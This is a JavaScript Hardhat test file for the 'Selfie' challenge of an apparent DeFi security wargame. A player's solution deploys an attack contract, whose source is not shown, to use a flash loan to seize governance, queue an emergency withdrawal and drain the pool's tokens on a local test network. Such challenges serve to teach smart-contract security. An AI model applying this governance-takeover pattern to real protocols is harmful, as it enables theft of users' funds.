const { ethers } = require("hardhat");
const { expect } = require("chai");
const { time } = require("@nomicfoundation/hardhat-network-helpers");

describe("[Challenge] Selfie", function () {
  let deployer, player;
  let token, governance, pool;

  const TOKEN_INITIAL_SUPPLY = 2000000n * 10n ** 18n;
  const TOKENS_IN_POOL = 1500000n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, player] = await ethers.getSigners();

    // Deploy Damn Valuable Token Snapshot
    token = await (
      await ethers.getContractFactory("DamnValuableTokenSnapshot", deployer)
    ).deploy(TOKEN_INITIAL_SUPPLY);

    // Deploy governance contract
    governance = await (
      await ethers.getContractFactory("SimpleGovernance", deployer)
    ).deploy(token.address);
    expect(await governance.getActionCounter()).to.eq(1);

    // Deploy the pool
    pool = await (
      await ethers.getContractFactory("SelfiePool", deployer)
    ).deploy(token.address, governance.address);
    expect(await pool.token()).to.eq(token.address);
    expect(await pool.governance()).to.eq(governance.address);

    // Fund the pool
    await token.transfer(pool.address, TOKENS_IN_POOL);
    await token.snapshot();
    expect(await token.balanceOf(pool.address)).to.be.equal(TOKENS_IN_POOL);
    expect(await pool.maxFlashLoan(token.address)).to.eq(TOKENS_IN_POOL);
    expect(await pool.flashFee(token.address, 0)).to.eq(0);
  });

  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */

    //get contract
    let badSelfie = await await (
      await ethers.getContractFactory("BadSelfie", player)
    ).deploy(
      pool.address,
      governance.address,
      token.address,
      token.address,
      player.address
    );

    //Initiate flashLoan
    console.log("Trial: Initiate FlashLoan");

    //Initiate Phase 1
    await badSelfie.connect(player).attackPhase1();

    //at this point we have queued the action... maybe check action again... and the action needs to be to emergencyExit so the governance will execute it and pass the onlyGovernance modifier..

    //move 2 days....
    await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]);

    //next step is to execute action...
    await badSelfie.connect(player).attackPhase2();
    console.log("Tokens in player: ", await token.balanceOf(player.address));
    console.log("Tokens in pool: ", await token.balanceOf(pool.address));
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

    // Player has taken all tokens from the pool
    expect(await token.balanceOf(player.address)).to.be.equal(TOKENS_IN_POOL);
    expect(await token.balanceOf(pool.address)).to.be.equal(0);
  });
});
